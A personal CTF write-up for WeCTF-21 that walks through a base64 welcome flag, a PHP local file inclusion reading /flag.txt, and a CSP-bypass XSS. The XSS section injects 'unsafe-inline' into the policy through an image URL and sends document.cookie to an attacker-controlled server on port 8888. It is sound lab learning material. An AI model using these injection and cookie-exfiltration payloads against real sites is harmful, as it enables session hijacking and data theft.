# WeCTF-21
Sloppy walk through of https://21.wectf.io/ CTF

6/19 @ 11am - 6/20 @ 11am
https://21.wectf.io/
Team: SaetheR
https://ctftime.org/team/1049619
	
	
## Challenges ##

> #1 "Welcome" 
Flag is b64decode("d2UlN0I1ODRjNGNiMC1jYjU4LTQ1YWItOTNhNC0yOWY1YmRhYzlmMjJAaGVsbG9faGFja2VycyU3RSU3RA==")

SOLUTION: Pop over to cyberchef and add string with filter From Base64 and URL Decode 
**flag: we{584c4cb0-cb58-45ab-93a4-29f5bdac9f22@hello_hackers~}**

> #2 "SDN"
Find a server from a router forwarding config?

Log dump has hex strings peppered through it
0x0800 0x06 0x06 0x000000ff 0x000000e5 0x13 0x5e 0x22 0xff 0xff

Converting those to decimal
2048 6 6 255 229 19 94 34 255 255

Pluck out what looks like an IP address? 229.19.94.34

**skipping for now**

> #3 "Cache" 
Flask-ish Django: One recent web app he developed with this is to display flag to admins.
This challenge requires user interaction. Send your payload to uv.ctf.so

Host 1 (San Francisco): cache.sf.ctf.so
Host 2 (Los Angeles): cache.la.ctf.so
Host 3 (New York): cache.ny.ctf.so
Host 4 (Singapore): cache.sg.ctf.so

Source Code

*SOLUTION* 

Looking through source code
- urls.py shows there's a /index and /flag path
- /flag shows error "Only admin can view this!"
- due to no token or token not equal to ADMIN_TOKEN
- So how do we send token?
- token is set as a cookie called token
- ADMIN_TOKEN is 123 defined in Dockerfile.test

TASK: using uv.ctf.so to simulate getting an admin to visit a URL, we need to set the ADMIN_TOKEN in env vars
- Create a web script to capture cookies of visitors
- Has to initiate from the targetted website for XSS to capture cookie

**skipping for now**

> #4 "Include"
yet another buggy PHP website.
Flag is at /flag.txt on filesystem
Host 1 (San Francisco): include.sf.ctf.so
Host 2 (Los Angeles): include.la.ctf.so
Host 3 (New York): include.ny.ctf.so
Host 4 (Singapore): include.sg.ctf.so

*SOLUTION*

Page returns
`	<?php
	show_source(__FILE__);
	@include $_GET["🤯"];
	Fatal error: Uncaught ValueError: Path cannot be empty in /var/www/html/index.php:3 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 3`
From <http://include.la.ctf.so/> 

Answer seems to be to pass the encoded version of the emoji with the path to the flag file?

Using web tool: https://onlineunicodetools.com/url-encode-unicode

🤯 = %f0%9f%a4%af

/flag.txt = %2fflag.txt

URL for flag is then: http://include.la.ctf.so/?%f0%9f%a4%af=%2fflag.txt

**FLAG: we{695ed01b-3d31-46d7-a4a3-06b744d20f4b@1nc1ud3_/etc/passwd_yyds!}**

> #5 "CSP 1"
Shame on Shou if his web app has XSS vulnerability. More shame on him if he does not know how to use CSP correctly. 

This challenge requires user interaction. Send your payload to uv.ctf.so Flag is in cookies of admin (Shou). 

Hint: Search Content-Security-Policy if you don't know what that is and check your browser console. 

-Host 1 (San Francisco): csp1.sf.ctf.so 
-Host 2 (Los Angeles): csp1.la.ctf.so 
-Host 3 (New York): csp1.ny.ctf.so 
-Host 4 (Singapore): csp1.sg.ctf.so
-Source Code
From <https://21.wectf.io/challenges/?solved=Include> 

*SOLUTION*

USING: https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py

send him to my cookie stealer? http://*your webserver*:888/cookie.html
or direct to py script: 'http://*your webserver*:8888/?'+document.cookie

! CSP is locked down, but allows URL src pulled from Content submitted via form. So we need to XSS via IMG tag.

`resp.headers["Content-Security-Policy"] = "default-src 'none'; connect-src 'self'; img-src " \
                                              f"'self' {filter_url(img_urls)}; script-src 'none'; " \
                                              "style-src 'self'; base-uri 'self'; form-action 'self' "`

?? could I inject a policy change via filter_url(img_urls) ??

`<img src="http://;'unsafe-inline';/foo.png">` yes!! getting close
I does allow me to inject anything between the scheme (http) and the image path!
`<img src="http://;script-src 'unsafe-inline';/foo.png" />`
`<script>alert('hi');</script>`

1. So for the script to get called, I need to get it's TLD added to the acceptable list, so the first line should create an HTML IMG with the same host:port as my script

`<img src="http://*your webserver*:8888/foo.png" />`

2. Next add my injection via an HTML IMG tag with my CSP rules added

`<img src="http://;script-src * 'unsafe-inline';connect-src *;" />`

3. Now add my test and cookie stealer script call

`<script>
alert(document.cookie);
var i=new Image;
i.src='http://*your webserver*:8888/?'+document.cookie;
</script>`

4. Submit the query and you should get a JS pop and logs in your stealer script!
5. Take URL created by web app and submit via Url Viewer helper app (http://uv.ctf.so) for challenge
6. Flag should be in your cookie grabber script logs!!

`2021-06-19 03:18 PM - 143.110.233.16    Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
------------------------------------------------------------------------------------------------------------------
flag                    ['we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}']`

**Flag is we{2bf90f00-f560-4aee-a402-d46490b53541@just_L1k3_<sq1_injEcti0n>}**
